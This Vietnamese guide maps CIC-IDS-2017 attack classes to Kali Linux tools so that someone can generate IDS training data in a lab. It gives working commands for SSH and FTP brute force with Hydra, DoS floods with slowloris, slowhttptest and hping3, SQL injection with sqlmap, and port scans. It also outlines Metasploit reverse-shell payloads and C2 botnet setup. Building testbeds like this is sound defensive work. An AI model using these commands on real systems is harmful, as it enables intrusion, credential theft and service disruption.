# Ánh Xạ Các Loại Tấn Công CIC-IDS-2017 Với Công Cụ Trên Kali Linux

Hoàn toàn **CÓ THỂ** sử dụng Kali Linux để giả lập chính xác các đợt tấn công tương tự như các nhãn (classes) có trong tập dữ liệu CIC-IDS-2017. Thực tế, đội ngũ tạo ra CIC-IDS-2017 tại đại học New Brunswick (UNB) cũng đã sử dụng chính các công cụ phổ biến này.

Dưới đây là bảng phân tích chi tiết từng Class tấn công trong CIC-IDS-2017 và công cụ tương ứng trên Kali Linux bạn có thể dùng trên **Máy 1 (Attacker)**, cũng như mục tiêu cần thiết lập trên **Máy 3 (Victim)**.

---

## 1. Brute Force (FTP, SSH)
Trong CIC-IDS-2017, các cuộc tấn công Brute Force được thực hiện nhắm vào dịch vụ SSH và FTP.

*   **Công cụ trên Kali Linux:** `Hydra`, `Medusa`, hoặc `Ncrack`.
*   **Câu lệnh ví dụ (Hydra):**
    ```bash
    # SSH Brute force
    hydra -l admin -P rockyou.txt ssh://<IP_Victim>
    
    # FTP Brute force
    hydra -L users.txt -P passwords.txt ftp://<IP_Victim>
    ```
*   **Mục tiêu (Victim):** Chạy container Docker cài sẵn OpenSSH server và vsftpd.

## 2. DoS / DDoS (Từ chối dịch vụ)
CIC-IDS-2017 bao gồm nhiều loại DoS: Hulk, GoldenEye, Slowloris, Slowhttptest. Hầu hết là tấn công ở Layer 7 (Application Layer) nhắm vào Web Server.

*   **Công cụ trên Kali Linux:** `slowloris`, `slowhttptest`, `hping3` (cho SYN Flood).
*   *Lưu ý: Hulk và GoldenEye thường là các script Python/C, bạn có thể dễ dàng tải (`git clone`) các script này về Kali.*
*   **Câu lệnh ví dụ:**
    ```bash
    # Slowloris
    slowloris <IP_Victim> -p 80 -s 500
    
    # Slowhttptest (Tấn công Slow POST / Slow Read)
    slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -t GET -u http://<IP_Victim>
    
    # DoS SYN Flood bằng Hping3
    hping3 -S --flood -V -p 80 <IP_Victim>
    ```
*   **Mục tiêu (Victim):** Web server thông thường (Apache, Nginx) chạy trên Docker.

## 3. Web Attack (Brute Force, XSS, SQL Injection)
Nhóm tấn công này tập trung vào các lỗ hổng trên ứng dụng Web.

*   **Công cụ trên Kali Linux:** `SQLMap`, `Nikto`, `Burp Suite` (hoặc `OWASP ZAP`), `WPScan`.
*   **Câu lệnh ví dụ:**
    ```bash
    # Khai thác SQL Injection
    sqlmap -u "http://<IP_Victim>/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=..." --dbs
    
    # Quét lỗ hổng Web tự động
    nikto -h http://<IP_Victim>
    ```
*   **Mục tiêu (Victim):** **Bắt buộc** phải sử dụng các ứng dụng web có sẵn lỗ hổng để Kali có thể tương tác. Khuyến nghị chạy các Docker Image như: `vulnerables/web-dvwa`, `bkimminich/juice-shop`, hoặc `tssoffsec/bwapp`.

## 4. PortScan (Quét cổng)
Dữ liệu quét mạng để tìm kiếm mục tiêu.

*   **Công cụ trên Kali Linux:** `Nmap`, `Masscan`.
*   **Câu lệnh ví dụ:**
    ```bash
    # Quét toàn diện (Comprehensive Scan)
    nmap -A -T4 <IP_Victim>
    
    # Quét siêu tốc
    masscan -p1-65535,U:1-65535 <IP_Victim> --rate=1000
    ```

## 5. Infiltration (Thâm nhập nội bộ)
Trong CIC-IDS-2017, Infiltration thường mô phỏng việc kẻ tấn công lừa nạn nhân tải xuống một tập tin độc hại (Drop file) hoặc khai thác lỗ hổng hệ điều hành, sau đó tạo một Backdoor (Reverse Shell).

*   **Công cụ trên Kali Linux:** `Metasploit Framework` (`msfconsole`), `Social Engineering Toolkit` (SET).
*   **Cách thức thực hiện:**
    1. Dùng `msfvenom` tạo một payload (ví dụ: file PDF độc hại hoặc file thực thi).
    2. Dùng `msfconsole` lắng nghe kết nối trả về (Meterpreter).
    3. Giả lập Nạn nhân (Victim) tải và chạy file đó.
*   **Mục tiêu (Victim):** Các máy ảo Windows (ví dụ Windows 7 hoặc Windows 10 chưa update) hoặc Metasploitable 2/3.

## 6. Botnet
Đây là loại khó cấu hình và tái tạo nhất. Với giới hạn tài nguyên chỉ có 2 Laptop trong mạng, bạn sẽ không thể mô phỏng một hệ thống C&C (Command and Control) và nhiều bots kết nối về một cách thực sự (vì tính chất Botnet cần lượng lớn thiết bị lây nhiễm).

*   **Khuyến nghị:** Cân nhắc loại bỏ Botnet ra khỏi scope của Testbed tự xây dựng, hoặc sử dụng lại dữ liệu của lớp Botnet từ dataset CIC-IDS-2017 gốc ghép vào dataset của bạn để huấn luyện.
*   **Công cụ (Nếu vẫn muốn thử nghiệm quy mô nhỏ):** `Metasploit` (thiết lập C2), `Ares` (Python C2 botnet).
*   **Cách thức thực hiện:** 
    1. Cài đặt C2 Server trên Kali (Máy 1).
    2. Chạy client script (Bot) trên Máy 3 (Victim).
    3. Gửi lệnh từ Kali bắt Máy 3 thực hiện các hành vi tấn công.

---

> [!TIP]
> **Tự Động Hóa (Automation):** Thay vì gõ tay từng lệnh trên Kali, bạn có thể viết các file `bash script` (`.sh`) hoặc `Python` kết hợp với thư viện `subprocess`. Khi muốn sinh dữ liệu, bạn chỉ việc chạy script, Kali sẽ lần lượt thực thi PortScan -> Web Attack -> DoS... và Máy Capture (Máy 2) sẽ tự động thu thập trọn vẹn vòng đời của một cuộc tấn công thực tế.
